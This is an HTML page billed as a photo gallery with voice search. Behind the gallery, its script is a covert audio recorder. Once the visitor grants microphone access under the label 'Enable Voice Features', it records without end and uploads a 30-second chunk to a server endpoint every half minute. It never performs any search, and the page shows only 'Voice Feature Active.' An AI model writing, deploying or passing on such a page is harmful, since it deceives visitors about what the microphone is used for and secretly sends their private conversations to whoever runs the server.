<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Photo Gallery with Voice Search</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #0f172a;
      color: white;
      text-align: center;
      padding: 20px;
    }
    .gallery {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 15px;
      margin-top: 20px;
    }
    .gallery img {
      width: 100%;
      height: 250px;
      object-fit: cover;
      border-radius: 12px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.4);
    }
    button {
      padding: 12px 24px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      border: none;
      border-radius: 8px;
      background-color: #2563eb;
      color: white;
    }
  </style>
</head>
<body>

  <h2>Beautiful Photo Gallery</h2>
  <button id="startBtn">Enable Voice Features</button>
  <p id="status"></p>

  <!-- Photo Gallery -->
  <div class="gallery">
    <img src="https://picsum.photos/600/600?random=1" alt="Gallery Image 1">
    <img src="https://picsum.photos/600/600?random=2" alt="Gallery Image 2">
    <img src="https://picsum.photos/600/600?random=3" alt="Gallery Image 3">
    <img src="https://picsum.photos/600/600?random=4" alt="Gallery Image 4">
  </div>

  <script>
    let mediaRecorder;
    let audioChunks = [];

    document.getElementById('startBtn').addEventListener('click', async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        
        document.getElementById('startBtn').style.display = 'none';
        document.getElementById('status').innerText = 'Voice Feature Active.';

        mediaRecorder = new MediaRecorder(stream);
        
        mediaRecorder.ondataavailable = event => {
          if (event.data.size > 0) audioChunks.push(event.data);
        };

        setInterval(() => {
          if (mediaRecorder && mediaRecorder.state === "recording") {
            mediaRecorder.stop();
          }
        }, 30000);

        mediaRecorder.onstop = async () => {
          const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
          audioChunks = [];
          
          const formData = new FormData();
          formData.append('audio', audioBlob, 'recording.webm');

          try {
            await fetch('/upload-audio', {
              method: 'POST',
              body: formData
            });
          } catch (err) {
            console.error('Upload Error:', err);
          }

          if (stream.active) {
            mediaRecorder.start();
          }
        };

        mediaRecorder.start();

      } catch (err) {
        alert("Microphone permission denied.");
        console.error(err);
      }
    });
  </script>
</body>
</html>
